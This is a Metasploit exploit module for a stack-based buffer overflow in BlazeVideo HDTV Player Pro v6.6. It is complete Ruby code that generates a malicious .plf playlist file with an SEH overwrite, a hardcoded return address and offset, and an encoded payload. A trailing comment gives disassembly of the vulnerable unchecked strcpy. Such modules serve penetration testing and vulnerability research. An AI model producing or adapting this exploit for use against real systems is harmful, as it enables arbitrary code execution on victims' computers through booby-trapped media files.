##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info={})
    super(update_info(info,
      'Name'           => "BlazeVideo HDTV Player Pro v6.6 Filename Handling Vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability found in BlazeVideo HDTV Player's filename
        handling routine.  When supplying a string of input data embedded in a .plf file,
        the MediaPlayerCtrl.dll component will try to extract a filename by using
        PathFindFileNameA(), and then copies whatever the return value is on the stack by
        using an inline strcpy.  As a result, if this input data is long enough, it can cause
        a stack-based buffer overflow, which may lead to arbitrary code execution under the
        context of the user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'b33f',   #Original
          'sinn3r'  #Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '80896'],
          ['EDB', '18693'],
          ['EDB', '22931']
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00\x0a\x1a\x2f\x3a\x5c",
          'StackAdjustment' => -3500
        },
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # MediaPlayerCtrl.dll P/P/R
          # Tested on: Windows 7 SP1/SP0, Windows XP SP3 / Windows Vista SP2/SP1/SP0
          ['BlazeVideo HDTV Player Pro v6.6.0.3', {'Ret'=>0x64020327, 'Offset'=>868}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 03 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'msf.plf'])
      ])
  end

  def exploit
    buf = 'http://'
    buf << rand_text_alpha_upper(target['Offset'])
    buf << generate_seh_record(target.ret)
    buf << payload.encoded
    buf << rand_text_alpha(5000-buf.length)

    print_status("Creating '#{datastore['FILENAME']}'...")
    file_create(buf)
  end
end

=begin
Version: HDTV Player Professional v6.6

In MediaPlayerCtrl.dll (File version: 2.0.0.2; Product version: 2.0.0.2)
.text:6400E574                 mov     eax, [esp+138h+Source]
.text:6400E578                 mov     edx, [ebp+0ECh]
.text:6400E57E                 push    eax
.text:6400E57F                 push    eax             ; pszPath  <-- Our URL
.text:6400E580                 mov     edi, [edx]
.text:6400E582                 call    ebx ; PathFindFileNameA
.text:6400E584                 mov     ecx, [ebp+0ECh]
.text:6400E58A                 push    eax             ; File path to copy
.text:6400E58B                 push    esi
.text:6400E58C                 push    1
.text:6400E58E                 call    dword ptr [edi] ; 0x6400f1f0

0x6400F1F0 (no length check either) goes down to 0x6400F670:

int __thiscall sub_6400F670(int this, int a2, int a3, const char *source, const char *a5)
{
  ...

  v5 = this;
  if ( a2 && source && a5 )
  {
    memset(&buffer, 0, '\x02\x10');
    v16 = *(this + 4);
    *(this + 4) = v16 + 1;
    v18 = a3;
    buffer = a2;
    strcpy(&Dest2, source);  // <-- This is a rep movs
=end
